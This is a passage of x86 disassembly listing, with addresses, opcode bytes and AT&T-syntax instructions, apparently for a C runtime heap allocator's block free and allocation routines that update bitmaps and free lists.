  40766a:	88 4a 04             	mov    %cl,0x4(%edx)
  40766d:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407670:	03 45 d4             	add    -0x2c(%ebp),%eax
  407673:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  407677:	85 c9                	test   %ecx,%ecx
  407679:	75 18                	jne    0x407693
  40767b:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407680:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  407683:	d3 ea                	shr    %cl,%edx
  407685:	f7 d2                	not    %edx
  407687:	8b 45 08             	mov    0x8(%ebp),%eax
  40768a:	8b 08                	mov    (%eax),%ecx
  40768c:	23 ca                	and    %edx,%ecx
  40768e:	8b 55 08             	mov    0x8(%ebp),%edx
  407691:	89 0a                	mov    %ecx,(%edx)
  407693:	eb 6b                	jmp    0x407700
  407695:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  407698:	83 e9 20             	sub    $0x20,%ecx
  40769b:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4076a0:	d3 e8                	shr    %cl,%eax
  4076a2:	f7 d0                	not    %eax
  4076a4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4076a7:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4076aa:	8b 8c 8a c4 00 00 00 	mov    0xc4(%edx,%ecx,4),%ecx
  4076b1:	23 c8                	and    %eax,%ecx
  4076b3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4076b6:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4076b9:	89 8c 90 c4 00 00 00 	mov    %ecx,0xc4(%eax,%edx,4)
  4076c0:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4076c3:	03 4d d4             	add    -0x2c(%ebp),%ecx
  4076c6:	8a 51 04             	mov    0x4(%ecx),%dl
  4076c9:	80 ea 01             	sub    $0x1,%dl
  4076cc:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4076cf:	03 45 d4             	add    -0x2c(%ebp),%eax
  4076d2:	88 50 04             	mov    %dl,0x4(%eax)
  4076d5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4076d8:	03 4d d4             	add    -0x2c(%ebp),%ecx
  4076db:	0f be 51 04          	movsbl 0x4(%ecx),%edx
  4076df:	85 d2                	test   %edx,%edx
  4076e1:	75 1d                	jne    0x407700
  4076e3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4076e6:	83 e9 20             	sub    $0x20,%ecx
  4076e9:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4076ee:	d3 e8                	shr    %cl,%eax
  4076f0:	f7 d0                	not    %eax
  4076f2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4076f5:	8b 51 04             	mov    0x4(%ecx),%edx
  4076f8:	23 d0                	and    %eax,%edx
  4076fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4076fd:	89 50 04             	mov    %edx,0x4(%eax)
  407700:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407703:	8b 51 08             	mov    0x8(%ecx),%edx
  407706:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407709:	8b 48 04             	mov    0x4(%eax),%ecx
  40770c:	89 4a 04             	mov    %ecx,0x4(%edx)
  40770f:	8b 55 cc             	mov    -0x34(%ebp),%edx
  407712:	8b 42 04             	mov    0x4(%edx),%eax
  407715:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407718:	8b 51 08             	mov    0x8(%ecx),%edx
  40771b:	89 50 08             	mov    %edx,0x8(%eax)
  40771e:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407721:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407724:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407727:	83 e1 01             	and    $0x1,%ecx
  40772a:	85 c9                	test   %ecx,%ecx
  40772c:	75 0c                	jne    0x40773a
  40772e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  407731:	3b 55 d8             	cmp    -0x28(%ebp),%edx
  407734:	0f 84 10 01 00 00    	je     0x40784a
  40773a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40773d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407740:	8d 14 c1             	lea    (%ecx,%eax,8),%edx
  407743:	89 55 e0             	mov    %edx,-0x20(%ebp)
  407746:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407749:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40774c:	8b 51 04             	mov    0x4(%ecx),%edx
  40774f:	89 50 04             	mov    %edx,0x4(%eax)
  407752:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407755:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407758:	89 48 08             	mov    %ecx,0x8(%eax)
  40775b:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40775e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407761:	89 42 04             	mov    %eax,0x4(%edx)
  407764:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407767:	8b 51 04             	mov    0x4(%ecx),%edx
  40776a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40776d:	89 42 08             	mov    %eax,0x8(%edx)
  407770:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407773:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  407776:	8b 41 04             	mov    0x4(%ecx),%eax
  407779:	3b 42 08             	cmp    0x8(%edx),%eax
  40777c:	0f 85 c8 00 00 00    	jne    0x40784a
  407782:	83 7d d8 20          	cmpl   $0x20,-0x28(%ebp)
  407786:	73 5b                	jae    0x4077e3
  407788:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40778b:	03 4d d8             	add    -0x28(%ebp),%ecx
  40778e:	0f be 51 04          	movsbl 0x4(%ecx),%edx
  407792:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407795:	03 45 d8             	add    -0x28(%ebp),%eax
  407798:	8a 48 04             	mov    0x4(%eax),%cl
  40779b:	80 c1 01             	add    $0x1,%cl
  40779e:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077a1:	03 45 d8             	add    -0x28(%ebp),%eax
  4077a4:	88 48 04             	mov    %cl,0x4(%eax)
  4077a7:	85 d2                	test   %edx,%edx
  4077a9:	75 16                	jne    0x4077c1
  4077ab:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4077b0:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4077b3:	d3 ea                	shr    %cl,%edx
  4077b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4077b8:	8b 08                	mov    (%eax),%ecx
  4077ba:	0b ca                	or     %edx,%ecx
  4077bc:	8b 55 08             	mov    0x8(%ebp),%edx
  4077bf:	89 0a                	mov    %ecx,(%edx)
  4077c1:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4077c6:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4077c9:	d3 e8                	shr    %cl,%eax
  4077cb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4077ce:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4077d1:	8b 4c 8a 44          	mov    0x44(%edx,%ecx,4),%ecx
  4077d5:	0b c8                	or     %eax,%ecx
  4077d7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4077da:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077dd:	89 4c 90 44          	mov    %ecx,0x44(%eax,%edx,4)
  4077e1:	eb 67                	jmp    0x40784a
  4077e3:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4077e6:	03 4d d8             	add    -0x28(%ebp),%ecx
  4077e9:	0f be 51 04          	movsbl 0x4(%ecx),%edx
  4077ed:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077f0:	03 45 d8             	add    -0x28(%ebp),%eax
  4077f3:	8a 48 04             	mov    0x4(%eax),%cl
  4077f6:	80 c1 01             	add    $0x1,%cl
  4077f9:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077fc:	03 45 d8             	add    -0x28(%ebp),%eax
  4077ff:	88 48 04             	mov    %cl,0x4(%eax)
  407802:	85 d2                	test   %edx,%edx
  407804:	75 1b                	jne    0x407821
  407806:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  407809:	83 e9 20             	sub    $0x20,%ecx
  40780c:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407811:	d3 ea                	shr    %cl,%edx
  407813:	8b 45 08             	mov    0x8(%ebp),%eax
  407816:	8b 48 04             	mov    0x4(%eax),%ecx
  407819:	0b ca                	or     %edx,%ecx
  40781b:	8b 55 08             	mov    0x8(%ebp),%edx
  40781e:	89 4a 04             	mov    %ecx,0x4(%edx)
  407821:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  407824:	83 e9 20             	sub    $0x20,%ecx
  407827:	b8 00 00 00 80       	mov    $0x80000000,%eax
  40782c:	d3 e8                	shr    %cl,%eax
  40782e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407831:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  407834:	8b 8c 8a c4 00 00 00 	mov    0xc4(%edx,%ecx,4),%ecx
  40783b:	0b c8                	or     %eax,%ecx
  40783d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407840:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407843:	89 8c 90 c4 00 00 00 	mov    %ecx,0xc4(%eax,%edx,4)
  40784a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40784d:	8b 55 d0             	mov    -0x30(%ebp),%edx
  407850:	89 11                	mov    %edx,(%ecx)
  407852:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407855:	03 45 d0             	add    -0x30(%ebp),%eax
  407858:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40785b:	89 48 fc             	mov    %ecx,-0x4(%eax)
  40785e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407861:	8b 02                	mov    (%edx),%eax
  407863:	83 e8 01             	sub    $0x1,%eax
  407866:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407869:	89 01                	mov    %eax,(%ecx)
  40786b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40786e:	83 3a 00             	cmpl   $0x0,(%edx)
  407871:	0f 85 61 01 00 00    	jne    0x4079d8
  407877:	83 3d 38 f2 45 00 00 	cmpl   $0x0,0x45f238
  40787e:	0f 84 43 01 00 00    	je     0x4079c7
  407884:	a1 30 f2 45 00       	mov    0x45f230,%eax
  407889:	c1 e0 0f             	shl    $0xf,%eax
  40788c:	8b 0d 38 f2 45 00    	mov    0x45f238,%ecx
  407892:	8b 51 0c             	mov    0xc(%ecx),%edx
  407895:	03 d0                	add    %eax,%edx
  407897:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40789a:	68 00 40 00 00       	push   $0x4000
  40789f:	68 00 80 00 00       	push   $0x8000
  4078a4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4078a7:	50                   	push   %eax
  4078a8:	ff 15 0c f0 40 00    	call   *0x40f00c
  4078ae:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4078b3:	8b 0d 30 f2 45 00    	mov    0x45f230,%ecx
  4078b9:	d3 ea                	shr    %cl,%edx
  4078bb:	a1 38 f2 45 00       	mov    0x45f238,%eax
  4078c0:	8b 48 08             	mov    0x8(%eax),%ecx
  4078c3:	0b ca                	or     %edx,%ecx
  4078c5:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  4078cb:	89 4a 08             	mov    %ecx,0x8(%edx)
  4078ce:	a1 38 f2 45 00       	mov    0x45f238,%eax
  4078d3:	8b 48 10             	mov    0x10(%eax),%ecx
  4078d6:	8b 15 30 f2 45 00    	mov    0x45f230,%edx
  4078dc:	c7 84 91 c4 00 00 00 	movl   $0x0,0xc4(%ecx,%edx,4)
  4078e3:	00 00 00 00 
  4078e7:	a1 38 f2 45 00       	mov    0x45f238,%eax
  4078ec:	8b 48 10             	mov    0x10(%eax),%ecx
  4078ef:	8a 51 43             	mov    0x43(%ecx),%dl
  4078f2:	80 ea 01             	sub    $0x1,%dl
  4078f5:	a1 38 f2 45 00       	mov    0x45f238,%eax
  4078fa:	8b 48 10             	mov    0x10(%eax),%ecx
  4078fd:	88 51 43             	mov    %dl,0x43(%ecx)
  407900:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  407906:	8b 42 10             	mov    0x10(%edx),%eax
  407909:	0f be 48 43          	movsbl 0x43(%eax),%ecx
  40790d:	85 c9                	test   %ecx,%ecx
  40790f:	75 14                	jne    0x407925
  407911:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  407917:	8b 42 04             	mov    0x4(%edx),%eax
  40791a:	24 fe                	and    $0xfe,%al
  40791c:	8b 0d 38 f2 45 00    	mov    0x45f238,%ecx
  407922:	89 41 04             	mov    %eax,0x4(%ecx)
  407925:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  40792b:	83 7a 08 ff          	cmpl   $0xffffffff,0x8(%edx)
  40792f:	0f 85 92 00 00 00    	jne    0x4079c7
  407935:	68 00 80 00 00       	push   $0x8000
  40793a:	6a 00                	push   $0x0
  40793c:	a1 38 f2 45 00       	mov    0x45f238,%eax
  407941:	8b 48 0c             	mov    0xc(%eax),%ecx
  407944:	51                   	push   %ecx
  407945:	ff 15 0c f0 40 00    	call   *0x40f00c
  40794b:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  407951:	8b 42 10             	mov    0x10(%edx),%eax
  407954:	50                   	push   %eax
  407955:	6a 00                	push   $0x0
  407957:	8b 0d 4c f2 45 00    	mov    0x45f24c,%ecx
  40795d:	51                   	push   %ecx
  40795e:	ff 15 40 f0 40 00    	call   *0x40f040
  407964:	8b 15 3c f2 45 00    	mov    0x45f23c,%edx
  40796a:	6b d2 14             	imul   $0x14,%edx,%edx
  40796d:	a1 40 f2 45 00       	mov    0x45f240,%eax
  407972:	03 c2                	add    %edx,%eax
  407974:	8b 0d 38 f2 45 00    	mov    0x45f238,%ecx
  40797a:	83 c1 14             	add    $0x14,%ecx
  40797d:	2b c1                	sub    %ecx,%eax
  40797f:	50                   	push   %eax
  407980:	8b 15 38 f2 45 00    	mov    0x45f238,%edx
  407986:	83 c2 14             	add    $0x14,%edx
  407989:	52                   	push   %edx
  40798a:	a1 38 f2 45 00       	mov    0x45f238,%eax
  40798f:	50                   	push   %eax
  407990:	e8 5b 23 00 00       	call   0x409cf0
  407995:	83 c4 0c             	add    $0xc,%esp
  407998:	8b 0d 3c f2 45 00    	mov    0x45f23c,%ecx
  40799e:	83 e9 01             	sub    $0x1,%ecx
  4079a1:	89 0d 3c f2 45 00    	mov    %ecx,0x45f23c
  4079a7:	8b 55 08             	mov    0x8(%ebp),%edx
  4079aa:	3b 15 38 f2 45 00    	cmp    0x45f238,%edx
  4079b0:	76 09                	jbe    0x4079bb
  4079b2:	8b 45 08             	mov    0x8(%ebp),%eax
  4079b5:	83 e8 14             	sub    $0x14,%eax
  4079b8:	89 45 08             	mov    %eax,0x8(%ebp)
  4079bb:	8b 0d 40 f2 45 00    	mov    0x45f240,%ecx
  4079c1:	89 0d 34 f2 45 00    	mov    %ecx,0x45f234
  4079c7:	8b 55 08             	mov    0x8(%ebp),%edx
  4079ca:	89 15 38 f2 45 00    	mov    %edx,0x45f238
  4079d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4079d3:	a3 30 f2 45 00       	mov    %eax,0x45f230
  4079d8:	8b e5                	mov    %ebp,%esp
  4079da:	5d                   	pop    %ebp
  4079db:	c3                   	ret
  4079dc:	cc                   	int3
  4079dd:	cc                   	int3
  4079de:	cc                   	int3
  4079df:	cc                   	int3
  4079e0:	55                   	push   %ebp
  4079e1:	8b ec                	mov    %esp,%ebp
  4079e3:	83 ec 38             	sub    $0x38,%esp
  4079e6:	56                   	push   %esi
  4079e7:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  4079ec:	6b c0 14             	imul   $0x14,%eax,%eax
  4079ef:	8b 0d 40 f2 45 00    	mov    0x45f240,%ecx
  4079f5:	03 c8                	add    %eax,%ecx
  4079f7:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4079fa:	8b 55 08             	mov    0x8(%ebp),%edx
  4079fd:	83 c2 17             	add    $0x17,%edx
  407a00:	83 e2 f0             	and    $0xfffffff0,%edx
  407a03:	89 55 d8             	mov    %edx,-0x28(%ebp)
  407a06:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407a09:	c1 f8 04             	sar    $0x4,%eax
  407a0c:	83 e8 01             	sub    $0x1,%eax
  407a0f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  407a12:	83 7d e0 20          	cmpl   $0x20,-0x20(%ebp)
  407a16:	7d 14                	jge    0x407a2c
  407a18:	83 ca ff             	or     $0xffffffff,%edx
  407a1b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407a1e:	d3 ea                	shr    %cl,%edx
  407a20:	89 55 dc             	mov    %edx,-0x24(%ebp)
  407a23:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%ebp)
  407a2a:	eb 15                	jmp    0x407a41
  407a2c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407a33:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407a36:	83 e9 20             	sub    $0x20,%ecx
  407a39:	83 c8 ff             	or     $0xffffffff,%eax
  407a3c:	d3 e8                	shr    %cl,%eax
  407a3e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  407a41:	8b 0d 34 f2 45 00    	mov    0x45f234,%ecx
  407a47:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  407a4a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407a4d:	3b 55 d4             	cmp    -0x2c(%ebp),%edx
  407a50:	73 24                	jae    0x407a76
  407a52:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407a55:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407a58:	23 08                	and    (%eax),%ecx
  407a5a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407a5d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407a60:	23 42 04             	and    0x4(%edx),%eax
  407a63:	0b c8                	or     %eax,%ecx
  407a65:	85 c9                	test   %ecx,%ecx
  407a67:	74 02                	je     0x407a6b
  407a69:	eb 0b                	jmp    0x407a76
  407a6b:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407a6e:	83 c1 14             	add    $0x14,%ecx
  407a71:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  407a74:	eb d4                	jmp    0x407a4a
  407a76:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407a79:	3b 55 d4             	cmp    -0x2c(%ebp),%edx
  407a7c:	0f 85 db 00 00 00    	jne    0x407b5d
  407a82:	a1 40 f2 45 00       	mov    0x45f240,%eax
  407a87:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407a8a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407a8d:	3b 0d 34 f2 45 00    	cmp    0x45f234,%ecx
  407a93:	73 24                	jae    0x407ab9
  407a95:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407a98:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407a9b:	23 02                	and    (%edx),%eax
  407a9d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407aa0:	8b 55 cc             	mov    -0x34(%ebp),%edx
  407aa3:	23 51 04             	and    0x4(%ecx),%edx
  407aa6:	0b c2                	or     %edx,%eax
  407aa8:	85 c0                	test   %eax,%eax
  407aaa:	74 02                	je     0x407aae
  407aac:	eb 0b                	jmp    0x407ab9
  407aae:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407ab1:	83 c0 14             	add    $0x14,%eax
  407ab4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407ab7:	eb d1                	jmp    0x407a8a
  407ab9:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407abc:	3b 0d 34 f2 45 00    	cmp    0x45f234,%ecx
  407ac2:	0f 85 95 00 00 00    	jne    0x407b5d
  407ac8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407acb:	3b 55 d4             	cmp    -0x2c(%ebp),%edx
  407ace:	73 16                	jae    0x407ae6
  407ad0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407ad3:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  407ad7:	74 02                	je     0x407adb
  407ad9:	eb 0b                	jmp    0x407ae6
  407adb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407ade:	83 c1 14             	add    $0x14,%ecx
  407ae1:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  407ae4:	eb e2                	jmp    0x407ac8
  407ae6:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407ae9:	3b 55 d4             	cmp    -0x2c(%ebp),%edx
  407aec:	75 49                	jne    0x407b37
  407aee:	a1 40 f2 45 00       	mov    0x45f240,%eax
  407af3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407af6:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407af9:	3b 0d 34 f2 45 00    	cmp    0x45f234,%ecx
  407aff:	73 16                	jae    0x407b17
  407b01:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407b04:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  407b08:	74 02                	je     0x407b0c
  407b0a:	eb 0b                	jmp    0x407b17
  407b0c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407b0f:	83 c0 14             	add    $0x14,%eax
  407b12:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407b15:	eb df                	jmp    0x407af6
  407b17:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407b1a:	3b 0d 34 f2 45 00    	cmp    0x45f234,%ecx
  407b20:	75 15                	jne    0x407b37
  407b22:	e8 f9 03 00 00       	call   0x407f20
  407b27:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407b2a:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  407b2e:	75 07                	jne    0x407b37
  407b30:	33 c0                	xor    %eax,%eax
  407b32:	e9 da 03 00 00       	jmp    0x407f11
  407b37:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407b3a:	52                   	push   %edx
  407b3b:	e8 f0 04 00 00       	call   0x408030
  407b40:	83 c4 04             	add    $0x4,%esp
  407b43:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407b46:	8b 51 10             	mov    0x10(%ecx),%edx
  407b49:	89 02                	mov    %eax,(%edx)
  407b4b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407b4e:	8b 48 10             	mov    0x10(%eax),%ecx
  407b51:	83 39 ff             	cmpl   $0xffffffff,(%ecx)
  407b54:	75 07                	jne    0x407b5d
  407b56:	33 c0                	xor    %eax,%eax
  407b58:	e9 b4 03 00 00       	jmp    0x407f11
  407b5d:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407b60:	89 15 34 f2 45 00    	mov    %edx,0x45f234
  407b66:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407b69:	8b 48 10             	mov    0x10(%eax),%ecx
  407b6c:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  407b6f:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407b72:	8b 02                	mov    (%edx),%eax
  407b74:	89 45 d0             	mov    %eax,-0x30(%ebp)
  407b77:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  407b7b:	74 23                	je     0x407ba0
  407b7d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407b80:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407b83:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407b86:	23 44 8a 44          	and    0x44(%edx,%ecx,4),%eax
  407b8a:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407b8d:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407b90:	8b 75 cc             	mov    -0x34(%ebp),%esi
  407b93:	23 b4 8a c4 00 00 00 	and    0xc4(%edx,%ecx,4),%esi
  407b9a:	0b c6                	or     %esi,%eax
  407b9c:	85 c0                	test   %eax,%eax
  407b9e:	75 35                	jne    0x407bd5
  407ba0:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  407ba7:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407baa:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407bad:	8b 55 dc             	mov    -0x24(%ebp),%edx
  407bb0:	23 54 81 44          	and    0x44(%ecx,%eax,4),%edx
  407bb4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407bb7:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407bba:	8b 75 cc             	mov    -0x34(%ebp),%esi
  407bbd:	23 b4 81 c4 00 00 00 	and    0xc4(%ecx,%eax,4),%esi
  407bc4:	0b d6                	or     %esi,%edx
  407bc6:	85 d2                	test   %edx,%edx
  407bc8:	75 0b                	jne    0x407bd5
  407bca:	8b 55 d0             	mov    -0x30(%ebp),%edx
  407bcd:	83 c2 01             	add    $0x1,%edx
  407bd0:	89 55 d0             	mov    %edx,-0x30(%ebp)
  407bd3:	eb d2                	jmp    0x407ba7
  407bd5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407bd8:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  407bde:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407be1:	8d 94 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%edx
  407be8:	89 55 fc             	mov    %edx,-0x4(%ebp)
  407beb:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  407bf2:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407bf5:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407bf8:	8b 55 dc             	mov    -0x24(%ebp),%edx
  407bfb:	23 54 81 44          	and    0x44(%ecx,%eax,4),%edx
  407bff:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407c02:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  407c06:	75 1a                	jne    0x407c22
  407c08:	c7 45 e0 20 00 00 00 	movl   $0x20,-0x20(%ebp)
  407c0f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407c12:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407c15:	8b 55 cc             	mov    -0x34(%ebp),%edx
  407c18:	23 94 81 c4 00 00 00 	and    0xc4(%ecx,%eax,4),%edx
  407c1f:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407c22:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  407c26:	7c 13                	jl     0x407c3b
  407c28:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407c2b:	d1 e0                	shl    $1,%eax
  407c2d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407c30:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407c33:	83 c1 01             	add    $0x1,%ecx
  407c36:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407c39:	eb e7                	jmp    0x407c22
  407c3b:	8b 55 e0             	mov    -0x20(%ebp),%edx
  407c3e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407c41:	8b 4c d0 04          	mov    0x4(%eax,%edx,8),%ecx
  407c45:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407c48:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407c4b:	8b 02                	mov    (%edx),%eax
  407c4d:	2b 45 d8             	sub    -0x28(%ebp),%eax
  407c50:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407c53:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407c56:	c1 f9 04             	sar    $0x4,%ecx
  407c59:	83 e9 01             	sub    $0x1,%ecx
  407c5c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407c5f:	83 7d ec 3f          	cmpl   $0x3f,-0x14(%ebp)
  407c63:	7e 07                	jle    0x407c6c
  407c65:	c7 45 ec 3f 00 00 00 	movl   $0x3f,-0x14(%ebp)
  407c6c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  407c6f:	3b 55 e0             	cmp    -0x20(%ebp),%edx
  407c72:	0f 84 18 02 00 00    	je     0x407e90
  407c78:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407c7b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407c7e:	8b 50 04             	mov    0x4(%eax),%edx
  407c81:	3b 51 08             	cmp    0x8(%ecx),%edx
  407c84:	0f 85 d0 00 00 00    	jne    0x407d5a
  407c8a:	83 7d e0 20          	cmpl   $0x20,-0x20(%ebp)
  407c8e:	7d 5f                	jge    0x407cef
  407c90:	b8 00 00 00 80       	mov    $0x80000000,%eax
  407c95:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407c98:	d3 e8                	shr    %cl,%eax
  407c9a:	f7 d0                	not    %eax
  407c9c:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407c9f:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407ca2:	8b 4c 8a 44          	mov    0x44(%edx,%ecx,4),%ecx
  407ca6:	23 c8                	and    %eax,%ecx
  407ca8:	8b 55 d0             	mov    -0x30(%ebp),%edx
  407cab:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407cae:	89 4c 90 44          	mov    %ecx,0x44(%eax,%edx,4)
  407cb2:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407cb5:	03 4d e0             	add    -0x20(%ebp),%ecx
  407cb8:	8a 51 04             	mov    0x4(%ecx),%dl
  407cbb:	80 ea 01             	sub    $0x1,%dl
  407cbe:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407cc1:	03 45 e0             	add    -0x20(%ebp),%eax
  407cc4:	88 50 04             	mov    %dl,0x4(%eax)
  407cc7:	8b 4d c8             	mov    -0x38(%ebp),%ecx
